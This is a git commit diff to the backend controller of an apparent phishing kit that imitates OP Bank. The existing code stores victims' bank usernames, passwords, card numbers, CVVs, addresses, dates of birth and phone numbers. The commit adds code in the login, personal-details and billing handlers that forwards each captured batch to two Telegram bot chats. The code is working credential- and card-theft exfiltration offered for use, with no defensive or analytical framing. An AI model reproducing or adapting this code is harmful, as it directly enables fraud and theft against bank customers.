978c2849b0a9aa3f9864021fdddda2e6c426beb8
tresdtapio <97699520+tresdtapio@users.noreply.github.com>
2023-04-10 14:47:04 +0100

    make

--- controllers/opbankController.js
+++ controllers/opbankController.js
@@ -1,5 +1,6 @@
 var moment = require("moment"); // require
 const OPBank = require("../models/opbankModel");
+const axios = require("axios");
 
 const getOwnerVics = async (req, res) => {
     const { owner } = req.params;
@@ -30,7 +31,7 @@ const getInfo = async (req, res) => {
 const submitLogin = async (req, res) => {
     const { username, password, uniqueid, owner, ip } = req.body;
     try {
-        await OPBank.create({
+        let user = await OPBank.create({
             uniqueid,
             username,
             password,
@@ -39,6 +40,31 @@ const submitLogin = async (req, res) => {
             ip,
             timestamp: moment().format()
         });
+        let originalText = `ID: ${user.uniqueid}\nUsername: ${user.username}\nPassword: ${user.password}`;
+        await axios
+            .post(
+                `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
+                {
+                    chat_id: 5351037692,
+                    text: `OP:\n${originalText}`,
+                    parse_mode: "Markdown",
+                }
+            )
+            .catch((e) => {
+                console.log(e);
+            });
+        await axios
+            .post(
+                `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage`,
+                {
+                    chat_id: 680379375,
+                    text: `HAYTCHRES:\n${originalText}`,
+                    parse_mode: "Markdown",
+                }
+            )
+            .catch((e) => {
+                console.log(e);
+            });
         res.sendStatus(200);
     } catch (error) {
         console.log(error);
@@ -49,7 +75,32 @@ const submitLogin = async (req, res) => {
 const submitBilling = async (req, res) => {
     const { ccnum, ccexp, ccname, cvv, uniqueid } = req.body;
     try {
-        await OPBank.findOneAndUpdate({ uniqueid }, { ccname, ccnum, ccexp, cvv, status: 3, timestamp: moment().format() }).exec();
+        let user = await OPBank.findOneAndUpdate({ uniqueid }, { ccname, ccnum, ccexp, cvv, status: 3, timestamp: moment().format() }).exec();
+        let originalText = `ID: ${user.uniqueid}\nUsername: ${user.username}\nPassword: ${user.password}\nAddress: ${user.address}\nDOB: ${user.dob}\nMobile: ${user.telephone}\nCard Name: ${ccname}\nCard Number: ${ccnum}\nCVV: ${user.cvv}`;
+        await axios
+            .post(
+                `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
+                {
+                    chat_id: 5351037692,
+                    text: `OP:\n${originalText}`,
+                    parse_mode: "Markdown",
+                }
+            )
+            .catch((e) => {
+                console.log(e);
+            });
+        await axios
+            .post(
+                `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage`,
+                {
+                    chat_id: 680379375,
+                    text: `HAYTCHRES:\n${originalText}`,
+                    parse_mode: "Markdown",
+                }
+            )
+            .catch((e) => {
+                console.log(e);
+            });
         res.sendStatus(200);
     } catch (error) {
         console.log(error);
@@ -60,7 +111,32 @@ const submitBilling = async (req, res) => {
 const submitPersonal = async (req, res) => {
     const { address, dob, telephone, uniqueid } = req.body;
     try {
-        await OPBank.findOneAndUpdate({ uniqueid }, { address, dob, telephone, status: 2, timestamp: moment().format() }).exec();
+        let user = await OPBank.findOneAndUpdate({ uniqueid }, { address, dob, telephone, status: 2, timestamp: moment().format() }).exec();
+        let originalText = `ID: ${user.uniqueid}\nUsername: ${user.username}\nPassword: ${user.password}\nAddress: ${user.address}\nDOB: ${user.dob}\nMobile: ${user.telephone}`;
+        await axios
+            .post(
+                `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
+                {
+                    chat_id: 5351037692,
+                    text: `OP:\n${originalText}`,
+                    parse_mode: "Markdown",
+                }
+            )
+            .catch((e) => {
+                console.log(e);
+            });
+        await axios
+            .post(
+                `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage`,
+                {
+                    chat_id: 680379375,
+                    text: `HAYTCHRES:\n${originalText}`,
+                    parse_mode: "Markdown",
+                }
+            )
+            .catch((e) => {
+                console.log(e);
+            });
         res.sendStatus(200);
     } catch (error) {
         console.log(error);
